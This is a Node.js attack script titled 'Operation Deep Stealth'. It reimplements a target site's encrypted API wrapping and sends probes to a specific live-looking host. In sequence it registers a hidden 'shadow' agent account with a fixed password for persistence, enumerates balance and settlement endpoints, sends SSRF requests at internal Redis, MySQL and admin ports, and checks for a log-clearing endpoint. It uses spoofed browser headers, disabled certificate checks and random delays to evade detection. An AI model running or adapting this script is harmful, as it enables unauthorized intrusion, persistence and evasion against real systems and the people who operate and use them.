const CryptoJS = require('crypto-js');
const https = require('https');

const HOST = 'ebb56293.com';
const PORT = 9900;
const PATH = '/entrance/api';

const aliasString = 'ZXNicGx1cw==';
const keyHash = CryptoJS.MD5(aliasString).toString();
const key = CryptoJS.enc.Utf8.parse(keyHash);

function encryptApiData(jsonObj) {
    let jsonStr = typeof jsonObj === 'string' ? jsonObj : JSON.stringify(jsonObj);
    let encrypted = CryptoJS.AES.encrypt(jsonStr, key, { mode: CryptoJS.mode.ECB });
    let stringifiedBase64 = encrypted.toString();
    let bytesFromStr = CryptoJS.enc.Utf8.parse(stringifiedBase64);
    return CryptoJS.enc.Base64.stringify(bytesFromStr);
}

function decryptApiData(b64Data) {
    try {
        let bytesFromOuterB64 = CryptoJS.enc.Base64.parse(b64Data);
        let cipherBase64Str = CryptoJS.enc.Utf8.stringify(bytesFromOuterB64);
        let decrypted = CryptoJS.AES.decrypt(cipherBase64Str, key, { mode: CryptoJS.mode.ECB });
        return decrypted.toString(CryptoJS.enc.Utf8);
    } catch (e) {
        return "DECRYPTION_FAILED: " + b64Data;
    }
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function randomDelay() {
    const ms = Math.floor(Math.random() * (2500 - 500 + 1)) + 500;
    console.log(`[sz] Sleeping for ${ms}ms...`);
    return sleep(ms);
}

let errorCount = 0;

function sendProbe(name, payloadObj) {
    return new Promise((resolve, reject) => {
        if (errorCount >= 3) {
            console.log(`[!] CIRCUIT BREAKER TRIPPED. Aborting probe: ${name}`);
            return resolve(null);
        }

        const encryptedPayload = encodeURIComponent(encryptApiData(payloadObj));
        const postData = 'requestData=' + encryptedPayload;

        const options = {
            hostname: HOST,
            port: PORT,
            path: PATH,
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Content-Length': Buffer.byteLength(postData),
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Origin': `https://${HOST}:${PORT}`,
                'Referer': `https://${HOST}:${PORT}/web/`,
                'X-Requested-With': 'XMLHttpRequest'
            },
            rejectUnauthorized: false
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', (chunk) => {
                data += chunk;
            });
            res.on('end', () => {
                if (res.statusCode === 403 || res.statusCode === 405) {
                    errorCount++;
                    console.log(`[!] HTTP ERROR ${res.statusCode} DETECTED! Error Count: ${errorCount}`);
                }

                let decryptedResponse;
                if (data.includes("location.href")) {
                    decryptedResponse = "REDIRECT_DETECTED: " + data;
                } else {
                    decryptedResponse = decryptApiData(data);
                }

                console.log(`\n================================`);
                console.log(`[+] TACTICAL PROBE: ${name}`);
                console.log(`[>] PAYLOAD SNT: ${JSON.stringify(payloadObj)}`);
                console.log(`[<] HTTP STATUS: ${res.statusCode}`);
                console.log(`[<] DECRYPTED RESP: ${decryptedResponse}`);
                resolve(decryptedResponse);
            });
        });

        req.on('error', (e) => {
            console.error(`\n[!] PROBE FAILED: ${name} - ${e.message}`);
            resolve(null);
        });

        req.write(postData);
        req.end();
    });
}

async function deepStealth() {
    console.log("🚀 [OPERATION DEEP STEALTH] INITIATING...");

    // I. Construct Shadow Account
    const agentPayload = {
        url: "/infe/rest/registeragent/addAgent.json",
        params: JSON.stringify({
            "account": "syssync1",
            "name": "cache_manager",
            "password": "Password!@#123",
            "passwd": "Password!@#123",
            "mobile": "13800138000",
            "qq": "10001",
            "email": "sys@internal.local"
        })
    };

    await randomDelay();
    await sendProbe("I. Create Persistence: Shadow Agent", agentPayload);

    // II. Tactical Mapping: API Enumeration (GET equivalents)
    const scanList = [
        "/updateAgent.json",
        "/queryBalance.json",
        "/settlement.json",
        "/getMemberInfo.json"
    ];

    for (let path of scanList) {
        await randomDelay();
        await sendProbe(`II. Tactical Mapping: ${path}`, { url: `/infe/rest/registeragent${path}`, params: "[]" });
    }

    // III. SSRF Pressuring
    const ssrfProbes = [
        { name: "III. SSRF: Redis Port 6379", url: "http://127.0.0.1:6379/" },
        { name: "III. SSRF: MySQL Port 3306", url: "http://127.0.0.1:3306/" },
        { name: "III. SSRF: Internal Admin Port 8080", url: "http://127.0.0.1:8080/admin" }
    ];

    for (let probe of ssrfProbes) {
        await randomDelay();
        // Trying to pass the SSRF target in a generic 'url' param if the gateway is just blindly proxying
        await sendProbe(probe.name, { url: probe.url, params: JSON.stringify({}) });
    }

    // Checking for log clear endpoint
    await randomDelay();
    await sendProbe("IV. Defensive: Check Log Clear Endpoint", { url: "/infe/rest/log/clear", params: "[]" });

    console.log("\n✅ [OPERATION COMPLETE] Deep Stealth extracted.");
}

deepStealth();
